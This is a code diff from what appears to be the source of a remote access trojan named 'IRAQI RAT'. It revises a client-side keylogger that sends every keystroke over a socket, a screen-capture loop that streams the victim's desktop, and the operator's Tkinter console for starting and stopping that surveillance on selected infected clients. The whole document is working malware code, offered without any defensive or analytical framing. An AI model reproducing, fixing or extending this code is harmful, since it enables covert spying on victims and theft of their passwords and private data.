@@ -1104,31 +1104,35 @@ class ClientAPP:
             return False
 
     def create_keylogger_thread(self):
-        if hasattr(self, 'listener') and self.listener.running:
-            print("Keylogger already running.")
-            return
-
         def on_press(key):
-            if not self.keylogger_active:            
-                print('letter')
+            if not self.keylogger_active:
+                print(self.keylogger_active)
                 return False
-            print('KeyLog letter')
-
+            print('Onprees Function is on')
             try:
-                if hasattr(key, 'char') and key.char is not None:
+                if hasattr(key, 'char'):
                     key_str = key.char
-                else:
+                elif hasattr(key, 'name'):
                     key_str = f"[{key.name.upper()}]"
+                else:
+                    key_str = str(key)
 
-                self.socket.send(f"KEYLOG:{key_str}".encode())
-                print('KeyLog Sent letter')
+                try:
+                    self.socket.send(f"KEYLOG:{key_str}".encode())
+                    print(f'Key: {key_str} sent')
+                except Exception as e:
+                    print(f"Send error: {e}")
+                    
             except Exception as e:
-                print(f"Send error: {e}")
+                print(f"Key processing error: {e}")
 
         def on_release(key):
             return self.keylogger_active
 
-        self.listener = Listener(on_press=on_press, on_release=on_release)
+        self.listener = Listener(
+            on_press=on_press,
+            on_release=on_release
+        )
         self.listener.start()
 
     def flush_key_buffer(self):
@@ -1140,32 +1144,30 @@ class ClientAPP:
         except Exception as e:
             print(f"Buffer flush error: {e}")
 
-
-
     def screen_share(self):
-        try:
             while self.screen_share_toggle:
-                # Capture screen
-                screenshot = pyautogui.screenshot()
-                frame = np.array(screenshot)
-                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-
-                # Compress frame
-                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 30])
-                buffer_size = len(buffer)
-
-                # Send frame size then data
-                self.socket.send(struct.pack('L', buffer_size))
-                self.socket.send(buffer)
-
-                # Control frame rate
-                time.sleep(0.033)
-
-            self.socket.send(b"ACK_STOP_SCREEN_SHARE")
-        except Exception as e:
-            print(f"Screen sharing error: {e}")
-        finally:
-            self.screen_share_toggle = False
+                try:
+                    if self.screen_share_toggle:
+                        # Capture screen
+                        screenshot = pyautogui.screenshot()
+                        frame = np.array(screenshot)
+                        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+                        
+                        # Compress frame
+                        _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 30])
+                        buffer_size = len(buffer)
+                        
+                        # Send frame size then data
+                        self.socket.send(struct.pack('L', buffer_size))
+                        self.socket.send(buffer)
+                        sleep(0.033)  # Control frame rate
+                    else:
+                        # self.socket.send('ACK_STOP_SCREEN'.encode())
+                        break
+                except Exception as e:
+                    print(f"Screen sharing error: {e}")
+                    self.screen_share_toggle = False
+                    break
 
 
     def take_screenshot(self, picname):
@@ -1528,12 +1530,13 @@ class ClientAPP:
                     print(cmd)
                     self.stop_keylogger()
                     self.socket.send('STOP_LOGGER'.encode())
-                    # print('STOP_LOGGER SENT')
+                    print('STOP_LOGGER SENT')
                 elif cmd == "START_SCREEN_SHARE":
                     self.screen_share_toggle = True
                     self.screen_share_thread = Thread(target=self.screen_share, daemon=True)
                     self.screen_share_thread.start()
                 elif cmd == "STOP_SCREEN_SHARE":
+                    print(cmd)
                     self.screen_share_toggle = False
                     if self.screen_share_thread:
                         self.screen_share_thread.join(timeout=1)
@@ -2204,33 +2207,33 @@ if __name__ == "__main__":
                         self.log(f"Decryption error: {e}")
                         
                 self.create_and_start_thread(decryption_task, f"decrypt_{random.randint(1000, 9999)}")
+
     def start_screen_share(self):
-        selected_client = self.get_selected_client()
-        if selected_client:
-            def screen_share_thread():
-                try:
-                    self.log("Starting screen share...")
-                    selected_client.send(b"START_SCREEN_SHARE")
-
-                    self.screen_viewer = tk.Toplevel(self.root)
-                    self.screen_viewer.title("Screen Share Viewer")
-                    self.screen_viewer.geometry("1024x768")
-
-                    self.screen_canvas = tk.Canvas(
-                        self.screen_viewer,
-                        bg="black",
-                        width=1024,
-                        height=768
-                    )
-                    self.screen_canvas.pack(fill="both", expand=True)
-
-                    self.screen_viewer_active = True
-                    self.receive_screen_updates(selected_client)
-                except Exception as e:
-                    self.log(f"Screen share error: {e}")
-                    self.stop_screen_share()
-
-            self.create_and_start_thread(screen_share_thread, f"screen_share_{random.randint(1000, 9999)}")
+            selected_client = self.get_selected_client()
+            if selected_client:
+                def screen_share_thread():
+                    try:
+                        self.log("Starting screen share...")
+                        selected_client.send(b"START_SCREEN_SHARE")
+                        self.screen_viewer = tk.Toplevel(self.root)
+                        self.screen_viewer.title("Screen Share Viewer")
+                        self.screen_viewer.geometry("1024x768")
+                        
+                        self.screen_canvas = tk.Canvas(
+                            self.screen_viewer,
+                            bg="black",
+                            width=1024,
+                            height=768
+                        )
+                        self.screen_canvas.pack(fill="both", expand=True)
+                        
+                        self.screen_viewer_active = True
+                        self.receive_screen_updates(selected_client)
+                    except Exception as e:
+                        self.log(f"Screen share error: {e}")
+                        self.stop_screen_share()
+                    
+                self.create_and_start_thread(screen_share_thread, f"screen_share_{random.randint(1000, 9999)}")
 
     def stop_screen_share(self):
         if self.screen_viewer_active:
@@ -2239,16 +2242,11 @@ if __name__ == "__main__":
                 self.log("Stopping screen share...")
                 try:
                     selected_client.send(b"STOP_SCREEN_SHARE")
-                    # Wait for client acknowledgment
-                    ack = selected_client.recv(1024)
-                    if ack == b"ACK_STOP_SCREEN_SHARE":
-                        self.log("Screen share stopped by client.")
-                except Exception as e:
-                    self.log(f"Error stopping screen share: {e}")
-
-            self.screen_viewer_active = False
-
-            if hasattr(self, 'screen_viewer') and self.screen_viewer:
+                except:
+                    pass
+                self.screen_viewer_active = False
+                
+            # if self.screen_viewer:
                 self.screen_viewer.destroy()
                 self.screen_viewer = None
 
@@ -2259,61 +2257,58 @@ if __name__ == "__main__":
                 if not size_data:
                     break
                 size = struct.unpack('L', size_data)[0]
-
                 frame_data = b""
                 remaining = size
 
-                while remaining > 0:
+                while True:
                     chunk = client_socket.recv(min(remaining, 8192))
                     if not chunk:
                         break
                     frame_data += chunk
                     remaining -= len(chunk)
 
-                if frame_data:
-                    nparr = np.frombuffer(frame_data, np.uint8)
-                    frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
-
-                    if frame is not None:
-                        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-                        image = Image.fromarray(frame)
-
-                        canvas_width = self.screen_canvas.winfo_width()
-                        canvas_height = self.screen_canvas.winfo_height()
-                        image.thumbnail((canvas_width, canvas_height), Image.Resampling.LANCZOS)
-
-                        photo = ImageTk.PhotoImage(image=image)
-                        self.screen_canvas.delete("all")
-                        self.screen_canvas.create_image(
-                            canvas_width // 2,
-                            canvas_height // 2,
-                            image=photo,
-                            anchor="center"
-                        )
-                        self.screen_canvas.image = photo
+                nparr = np.frombuffer(frame_data, np.uint8)
+                frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+                
+                if frame is not None:
+                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+                    image = Image.fromarray(frame)
+                    
+                    canvas_width = self.screen_canvas.winfo_width()
+                    canvas_height = self.screen_canvas.winfo_height()
+                    image.thumbnail((canvas_width, canvas_height), Image.Resampling.LANCZOS)
+                    
+                    photo = ImageTk.PhotoImage(image=image)
+                    
+                    self.screen_canvas.delete("all")
+                    self.screen_canvas.create_image(
+                        canvas_width//2,
+                        canvas_height//2,
+                        image=photo,
+                        anchor="center"
+                    )
+                    self.screen_canvas.image = photo
         except Exception as e:
-            self.log(f"Screen sharing error: {e}")
-        finally:
+            # self.log(f"Screen sharing error: {e}")
             self.stop_screen_share()
+            self.log('Screen Sharing has been Terminated')
+            del chunk
+            return
+
 
 
     def start_keylogger(self):
-        if "keylogger" in self.running_threads:
-            self.log("Keylogger is already running.")
-            return
-
         selected_client = self.get_selected_client()
         if selected_client:
             def keylogger_thread():
                 try:
                     self.log("Starting keylogger...")
                     selected_client.send(b"START_KEYLOGGER")
-                    
                     self.keylog_window = tk.Toplevel(self.root)
                     self.keylog_window.title("Keylogger")
                     self.keylog_window.geometry("600x400")
                     self.keylog_window.configure(bg=self.colors["bg_dark"])
-
+                    
                     self.keylog_text = tk.Text(
                         self.keylog_window,
                         bg=self.colors["bg_medium"],
@@ -2322,28 +2317,23 @@ if __name__ == "__main__":
                         wrap=tk.WORD
                     )
                     self.keylog_text.pack(fill="both", expand=True, padx=10, pady=10)
-
+                    
                     while True:
                         try:
                             data = selected_client.recv(BUFFER_SIZE).decode()
-                            if not data or 'STOP_LOGGER' in data:
-                                self.log("Keylogger Terminated")
+                            if 'STOP_LOGGER' in data or not data.startswith("KEYLOG:"):
+                                self.log('Keylogger Terminated')
                                 break
-                            if data.startswith("KEYLOG:"):
-                                keystroke = data.replace("KEYLOG:", "")
-                                self.keylog_text.insert(tk.END, keystroke)
-                                self.keylog_text.see(tk.END)
-                                self.log(keystroke)
+                            keystroke = data.replace("KEYLOG:", "")
+                            self.keylog_text.insert(tk.END, keystroke)
+                            self.keylog_text.see(tk.END)
                         except Exception as e:
-                            self.log(f"Keylogger receive error: {e}")
-                            break
+                            continue
                 except Exception as e:
                     self.log(f"Keylogger error: {e}")
-                finally:
-                    del self.running_threads["keylogger"]
 
-            self.running_threads["keylogger"] = threading.Thread(target=keylogger_thread)
-            self.running_threads["keylogger"].start()
+            self.create_and_start_thread(keylogger_thread, f"keylogger_{random.randint(1000, 9999)}")
+
 
     def stop_keylogger(self):
         selected_client = self.get_selected_client()
@@ -2351,9 +2341,7 @@ if __name__ == "__main__":
             try:
                 self.log("Stopping keylogger...")
                 selected_client.send(b"STOP_KEYLOGGER")
-                if hasattr(self, 'keylog_window'):
-                    self.keylog_window.destroy()
-
+                self.keylog_window.destroy()
                 if "keylogger" in self.running_threads:
                     self.running_threads["keylogger"].join(timeout=1.0)
                     del self.running_threads["keylogger"]
@@ -2572,7 +2560,7 @@ def accept_clients():
             break
             
 if __name__ == "__main__":
-    showwarning(title='Important Notice', message='This is the first version of the IRAQI RAT. You may encounter bugs or issues. Please report any problems for future improvements.\nInstagram: apkaless')
+    # showwarning(title='Important Notice', message='This is the first version of the IRAQI RAT. You may encounter bugs or issues. Please report any problems for future improvements.\nInstagram: apkaless')
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind(SERVER_ADDRESS)
     server_socket.listen(10)
